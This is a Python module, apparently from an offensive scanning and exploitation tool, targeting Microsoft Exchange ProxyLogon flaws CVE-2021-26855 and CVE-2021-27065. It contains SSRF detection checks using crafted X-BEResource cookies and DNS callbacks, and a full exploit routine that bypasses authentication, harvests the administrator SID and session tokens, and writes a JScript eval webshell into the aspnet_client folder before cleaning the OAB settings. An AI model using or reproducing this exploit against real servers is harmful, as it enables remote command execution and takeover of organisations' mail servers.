#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import threading
from thirdparty import requests
import re
from urllib.parse import urlparse
from urllib.parse import urlencode
from thirdparty.tld import get_tld, get_fld
import json
from struct import unpack
from base64 import b64encode, b64decode
from module import globals
from core.verify import verify
from module.api.dns import dns_result, dns_request
from thirdparty.requests_toolbelt.utils import dump


class Exchange():
    def __init__(self, url):
        self.url = url
        if self.url[-1] == "/":
            self.url = self.url[:-1]
        self.raw_data = None
        self.vul_info = {}
        self.ua = globals.get_value("UA")  # 获取全局变量UA
        self.timeout = globals.get_value("TIMEOUT")  # 获取全局变量UA
        self.headers = globals.get_value("HEADERS")  # 获取全局变量HEADERS
        self.threadLock = threading.Lock()

    def cve_2021_26855_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "Microsoft Exchange: CVE-2021-26855"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_payd"] = "null"
        self.vul_info["vul_name"] = "Microsoft Exchange Server SSRF"
        self.vul_info["vul_numb"] = "CVE-2021-26855"
        self.vul_info["vul_apps"] = "Exchange"
        self.vul_info["vul_date"] = "2021-03-03"
        self.vul_info["vul_vers"] = "Exchange Server 2010 2013 2016 2019"
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "SSRF"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "Exchange 中身份验证后的任意文件写入漏洞。攻击者可以通过 Exchange 服务器进行身份验证，同时可以利用漏洞将文件写入服务器上的任何路径。也可以通过利用 CVE-2021-26855 SSRF 漏洞或通过破坏合法管理员的凭据来进行身份验证。"
        self.vul_info["cre_date"] = "2021-03-07"
        self.vul_info["cre_auth"] = "zhzyker"
        url = self.url + "/owa/auth/x.js"
        dns = dns_request()
        cookie_local = "X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3; X-BEResource=localhost/owa/auth/logon.aspx?~3;"
        cookie_dns = "X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3; X-BEResource=localhost/owa/auth/logon.aspx?~3;".replace("localhost", dns)
        try:
            headers = {
                "User-agent": self.ua,
                "Cookie": cookie_dns,
                "Connection": "close"
            }
            res = requests.get(url, headers=headers, timeout=self.timeout, verify=False)
            if dns_result(dns):
                self.vul_info["vul_data"] = dump.dump_all(res).decode('utf-8', 'ignore')
                self.vul_info["prt_resu"] = "PoCSuCCeSS"
                self.vul_info["vul_payd"] = headers["Cookie"]
                self.vul_info["prt_info"] = "[ssrf] [dns] [cookie: " + headers["Cookie"] + "]"
            else:
                headers = {
                    "User-agent": self.ua,
                    "Cookie": cookie_local,
                    "Connection": "close"
                }
                res = requests.get(url, headers=headers, timeout=self.timeout, verify=False)
                if res.status_code == 500 and "NegotiateSecurityContext failed with for host" in res.text:
                    if r"TargetUnknown" in res.text and r"localhost" in res.text:
                        self.vul_info["vul_data"] = dump.dump_all(res).decode('utf-8', 'ignore')
                        self.vul_info["prt_resu"] = "PoC_MaYbE"
                        self.vul_info["vul_payd"] = headers["Cookie"]
                        self.vul_info["prt_info"] = "[ssrf] [maybe] [cookie: " + headers["Cookie"] + "]"
            verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception as error:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()

    def cve_2021_27065_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "Microsoft Exchange: CVE-2021-27065"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_payd"] = "null"
        self.vul_info["vul_name"] = "Microsoft Exchange Server Arbitrary File Write"
        self.vul_info["vul_numb"] = "CVE-2021-27065"
        self.vul_info["vul_apps"] = "Exchange"
        self.vul_info["vul_date"] = "2021-03-03"
        self.vul_info["vul_vers"] = "Exchange Server 2010 2013 2016 2019"
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "Arbitrary File Write"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "Exchange 中身份验证后的任意文件写入漏洞。攻击者可以通过 Exchange 服务器进行身份验证，" \
                                    "同时可以利用漏洞将文件写入服务器上的任何路径。也可以通过利用 CVE-2021-26855 SSRF " \
                                    "漏洞组合进行getshell。"
        self.vul_info["cre_date"] = "2021-03-12"
        self.vul_info["cre_auth"] = "zhzyker"

        def __unpack_str(byte_string):
            return byte_string.decode('UTF-8').replace('\x00', '')

        def __unpack_int(format, data):
            return unpack(format, data)[0]

        def __exploit(url, name, path, qs='', data='', cookies=[], headers={}):

            cookies = list(cookies)
            cookies.extend([
                'X-BEResource=a]@%s:444%s?%s#~1941962753' % (name, path, qs),
            ])
            if not headers:
                headers = {
                    'Content-Type': 'application/json'
                }

            headers['Cookie'] = ';'.join(cookies)
            headers['msExchLogonMailbox'] = 'S-1-5-20'
            try:
                r = requests.post(url + "/ecp/y.js", headers=headers, data=data, verify=False, allow_redirects=False)
                return r
            except:
                return False

        def _get_sid(url, name, mail):
            payload = '''
        <Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
            <Request>
              <EMailAddress>%s</EMailAddress>
              <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
            </Request>
        </Autodiscover>
        ''' % mail
            headers = {
                'User-Agent': 'ExchangeServicesClient/0.0.0.0',
                'Content-Type': 'text/xml'
            }
            r = __exploit(url, name, '/autodiscover/autodiscover.xml', qs='', data=payload, headers=headers)
            res = re.search('<LegacyDN>(.*?)</LegacyDN>', r.text)
            if res:
                headers = {
                    'X-Clientapplication': 'Outlook/15.0.4815.1002',
                    'X-Requestid': 'x',
                    'X-Requesttype': 'Connect',
                    'Content-Type': 'application/mapi-http',
                }
                legacyDN = res.group(1)
                payload = legacyDN + '\x00\x00\x00\x00\x00\x20\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00'
                r = __exploit(url, name, '/mapi/emsmdb/', qs='', data=payload, headers=headers)
                res = re.search('with SID ([S\-0-9]+) ', r.text)
                if res:
                    return res.group(1)
                else:
                    return False
            else:
                return False

        def _parse_challenge(auth):
            target_info_field = auth[40:48]
            target_info_len = __unpack_int('H', target_info_field[0:2])
            target_info_offset = __unpack_int('I', target_info_field[4:8])

            target_info_bytes = auth[target_info_offset:target_info_offset + target_info_len]

            domain_name = ''
            computer_name = ''
            info_offset = 0
            while info_offset < len(target_info_bytes):
                av_id = __unpack_int('H', target_info_bytes[info_offset:info_offset + 2])
                av_len = __unpack_int('H', target_info_bytes[info_offset + 2:info_offset + 4])
                av_value = target_info_bytes[info_offset + 4:info_offset + 4 + av_len]

                info_offset = info_offset + 4 + av_len
                if av_id == 2:  # MsvAvDnsDomainName
                    domain_name = __unpack_str(av_value)
                elif av_id == 3:  # MsvAvDnsComputerName
                    computer_name = __unpack_str(av_value)
            #if r"-" in domain_name and r"-" in computer_name:
            return domain_name, computer_name
            #else:
            #    return False

        def _get_email(url):
            try:
                url = get_fld(url)
                return url
            except:
                return "unkonw"
        try:
            self.getipport = urlparse(self.url)
            self.hostname = self.getipport.hostname
            self.port = self.getipport.port
            if self.port == None and r"https://" in self.url:
                self.port = 443
            elif self.port == None and r"http://" in self.url:
                self.port = 80
            if bool(re.search(r'\d', self.url)):
                try:
                    from urllib3.contrib import pyopenssl as reqs
                    x509 = reqs.OpenSSL.crypto.load_certificate(reqs.OpenSSL.crypto.FILETYPE_PEM, reqs.ssl.get_server_certificate((self.hostname, self.port)))
                    keys = reqs.get_subj_alt_name(x509)[0]
                    for k in keys:
                        MAIL = "administrator@" + _get_email("https://" + k)
                except:
                    MAIL = "administrator@" + _get_email(self.url)
            else:
                MAIL = "administrator@" + _get_email(self.url)

            # Getting ComputerName and DomainName
            url = self.url + "/rpc/"
            ntlm_type1 = "TlRMTVNTUAABAAAAl4II4gAAAAAAAAAAAAAAAAAAAAAKALpHAAAADw=="
            headers = {
                'Authorization': 'Negotiate %s' % ntlm_type1
            }
            r = requests.get(url, headers=headers, timeout=self.timeout, verify=False)
            # assert r.status_code == 401, "Error while getting ComputerName"
            auth_header = r.headers['WWW-Authenticate']
            auth = re.search('Negotiate ([A-Za-z0-9/+=]+)', auth_header).group(1)

            domain_name, computer_name = _parse_challenge(b64decode(auth))
            # print('[*] Domain Name   =', domain_name)
            # print('[*] Computer Name =', computer_name)
            NAME = computer_name
            # get SID
            sid = _get_sid(self.url, NAME, MAIL)
            # print(sid)
            payload = '<r at="NTLM" ln="%s"><s t="0">%s</s></r>' % (MAIL.split('@')[0], sid)
            r = __exploit(self.url, NAME, '/ecp/proxyLogon.ecp', qs='', data=payload)
            session_id = r.cookies.get('ASP.NET_SessionId')
            canary = r.cookies.get('msExchEcpCanary')
            # print('[*] get ASP.NET_SessionId =', session_id)
            # print('[*] get msExchEcpCanary   =', canary)
            try:
                extra_cookies = [
                    'ASP.NET_SessionId=' + session_id,
                    'msExchEcpCanary=' + canary
                ]
            except:
                extra_cookies = [
                    'ASP.NET_SessionId=' + str(session_id),
                    'msExchEcpCanary=' + str(canary)
                ]
            # Getting OAB information
            qs = urlencode({
                'schema': 'OABVirtualDirectory',
                'msExchEcpCanary': canary
            })
            r = __exploit(self.url, NAME, '/ecp/DDI/DDIService.svc/GetObject', qs=qs, data='', cookies=extra_cookies)
            try:
                identity = r.json()['d']['Output'][0]['Identity']
                # print('[*] OAB Name', identity['DisplayName'])
                # print('[*] OAB ID  ', identity['RawIdentity'])
            except:
                identity = False
            if NAME and sid and session_id and canary and identity:
                self.vul_info["vul_data"] = dump.dump_all(r).decode('utf-8', 'ignore')
                self.vul_info["prt_resu"] = "PoCSuCCeSS"
                self.vul_info["vul_payd"] = ntlm_type1
                self.vul_info["prt_info"] = "[file write] [email:" + MAIL + "] [sid:" + sid + "] [oab-id:" + identity['RawIdentity'] + "]"
            verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception as error:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()

    def cve_2021_27065_exp(self, cmd ,file, email):
        vul_name = "Microsoft Exchange: CVE-2021-27065"
        FILE_PATH = 'C:\\inetpub\\wwwroot\\aspnet_client\\' + file
        FILE_DATA = '<script language="JScript" runat="server">function Page_Load(){eval(Request["v"],"unsafe");}</script>'
        def __unpack_str(byte_string):
            return byte_string.decode('UTF-8').replace('\x00', '')

        def __unpack_int(format, data):
            return unpack(format, data)[0]

        def __exploit(url, name, path, qs='', data='', cookies=[], headers={}):

            cookies = list(cookies)
            cookies.extend([
                'X-BEResource=a]@%s:444%s?%s#~1941962753' % (name, path, qs),
            ])
            if not headers:
                headers = {
                    'Content-Type': 'application/json'
                }

            headers['Cookie'] = ';'.join(cookies)
            headers['msExchLogonMailbox'] = 'S-1-5-20'
            try:
                r = requests.post(url + "/ecp/y.js", headers=headers, data=data, verify=False, allow_redirects=False)
                return r
            except:
                return False

        def _get_sid(url, name, mail):
            payload = '''
        <Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
            <Request>
              <EMailAddress>%s</EMailAddress>
              <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
            </Request>
        </Autodiscover>
        ''' % mail
            headers = {
                'User-Agent': 'ExchangeServicesClient/0.0.0.0',
                'Content-Type': 'text/xml'
            }
            r = __exploit(url, name, '/autodiscover/autodiscover.xml', qs='', data=payload, headers=headers)
            res = re.search('<LegacyDN>(.*?)</LegacyDN>', r.text)
            if res:
                headers = {
                    'X-Clientapplication': 'Outlook/15.0.4815.1002',
                    'X-Requestid': 'x',
                    'X-Requesttype': 'Connect',
                    'Content-Type': 'application/mapi-http',
                }
                legacyDN = res.group(1)
                payload = legacyDN + '\x00\x00\x00\x00\x00\x20\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00'
                r = __exploit(url, name, '/mapi/emsmdb/', qs='', data=payload, headers=headers)
                res = re.search('with SID ([S\-0-9]+) ', r.text)
                if res:
                    return res.group(1)
                else:
                    return False
            else:
                return False

        def _parse_challenge(auth):
            target_info_field = auth[40:48]
            target_info_len = __unpack_int('H', target_info_field[0:2])
            target_info_offset = __unpack_int('I', target_info_field[4:8])

            target_info_bytes = auth[target_info_offset:target_info_offset + target_info_len]

            domain_name = ''
            computer_name = ''
            info_offset = 0
            while info_offset < len(target_info_bytes):
                av_id = __unpack_int('H', target_info_bytes[info_offset:info_offset + 2])
                av_len = __unpack_int('H', target_info_bytes[info_offset + 2:info_offset + 4])
                av_value = target_info_bytes[info_offset + 4:info_offset + 4 + av_len]

                info_offset = info_offset + 4 + av_len
                if av_id == 2:  # MsvAvDnsDomainName
                    domain_name = __unpack_str(av_value)
                elif av_id == 3:  # MsvAvDnsComputerName
                    computer_name = __unpack_str(av_value)
            return domain_name, computer_name

        def _get_email(url):
            try:
                url = get_fld(url)
                return url
            except:
                return "unkonw"
        try:
            MAIL = email
            print('[+] Test Email =', MAIL)
            # Getting ComputerName and DomainName
            url = self.url + "/rpc/"
            ntlm_type1 = "TlRMTVNTUAABAAAAl4II4gAAAAAAAAAAAAAAAAAAAAAKALpHAAAADw=="
            headers = {
                'Authorization': 'Negotiate %s' % ntlm_type1
            }
            r = requests.get(url, headers=headers, timeout=self.timeout, verify=False)
            assert r.status_code == 401, "Error while getting ComputerName"
            auth_header = r.headers['WWW-Authenticate']
            auth = re.search('Negotiate ([A-Za-z0-9/+=]+)', auth_header).group(1)
            domain_name, computer_name = _parse_challenge(b64decode(auth))
            print('[*] Domain Name   =', domain_name)
            print('[*] Computer Name =', computer_name)
            NAME = computer_name
            # get SID
            sid = _get_sid(self.url, NAME, MAIL)
            print('[*] Login sid =', sid)
            payload = '<r at="NTLM" ln="%s"><s t="0">%s</s></r>' % (MAIL.split('@')[0], sid)
            r = __exploit(self.url, NAME, '/ecp/proxyLogon.ecp', qs='', data=payload)
            session_id = r.cookies.get('ASP.NET_SessionId')
            canary = r.cookies.get('msExchEcpCanary')
            print('[*] get ASP.NET_SessionId =', session_id)
            print('[*] get msExchEcpCanary   =', canary)
            try:
                extra_cookies = [
                    'ASP.NET_SessionId=' + session_id,
                    'msExchEcpCanary=' + canary
                ]
            except:
                extra_cookies = [
                    'ASP.NET_SessionId=' + str(session_id),
                    'msExchEcpCanary=' + str(canary)
                ]
            # Getting OAB information
            qs = urlencode({
                'schema': 'OABVirtualDirectory',
                'msExchEcpCanary': canary
            })
            r = __exploit(self.url, NAME, '/ecp/DDI/DDIService.svc/GetObject', qs=qs, data='', cookies=extra_cookies)
            try:
                identity = r.json()['d']['Output'][0]['Identity']
                print('[*] OAB Name', identity['DisplayName'])
                print('[*] OAB ID  ', identity['RawIdentity'])
            except:
                identity = False
            print('[*] Setting up webshell payload through OAB')
            qs = urlencode({
                'schema': 'OABVirtualDirectory',
                'msExchEcpCanary': canary
            })
            payload = json.dumps({
                'identity': {
                    '__type': 'Identity:ECP',
                    'DisplayName': identity['DisplayName'],
                    'RawIdentity': identity['RawIdentity']
                },
                'properties': {
                    'Parameters': {
                        '__type': 'JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel',
                        'ExternalUrl': 'http://f/' + FILE_DATA
                    }
                }
            })
            r = __exploit(self.url, NAME, '/ecp/DDI/DDIService.svc/SetObject', qs=qs, data=payload, cookies=extra_cookies)
            if r.status_code == 200:
                print('[*] Writing shell')
                qs = urlencode({
                    'schema': 'ResetOABVirtualDirectory',
                    'msExchEcpCanary': canary
                })
                payload = json.dumps({
                    'identity': {
                        '__type': 'Identity:ECP',
                        'DisplayName': identity['DisplayName'],
                        'RawIdentity': identity['RawIdentity']
                    },
                    'properties': {
                        'Parameters': {
                            '__type': 'JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel',
                            'FilePathName': FILE_PATH
                        }
                    }
                })
                r = __exploit(self.url, NAME, '/ecp/DDI/DDIService.svc/SetObject', qs=qs, data=payload, cookies=extra_cookies)

                # Set-OABVirtualDirectory
                print('[*] Cleaning OAB')
                qs = urlencode({
                    'schema': 'OABVirtualDirectory',
                    'msExchEcpCanary': canary
                })
                payload = json.dumps({
                    'identity': {
                        '__type': 'Identity:ECP',
                        'DisplayName': identity['DisplayName'],
                        'RawIdentity': identity['RawIdentity']
                    },
                    'properties': {
                        'Parameters': {
                            '__type': 'JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel',
                            'ExternalUrl': ''
                        }
                    }
                })
                r = __exploit(self.url, NAME, '/ecp/DDI/DDIService.svc/SetObject', qs=qs, data=payload, cookies=extra_cookies)
            up = '[+] upload webshell is ' + self.url + "/aspnet_client/" + file
            self.raw_data = dump.dump_all(r).decode('utf-8', 'ignore')
            verify.exploit_print(up, self.raw_data)
        except requests.exceptions.Timeout:
            verify.timeout_print(vul_name)
        except requests.exceptions.ConnectionError:
            verify.connection_print(vul_name)
        except Exception:
            verify.error_print(vul_name)

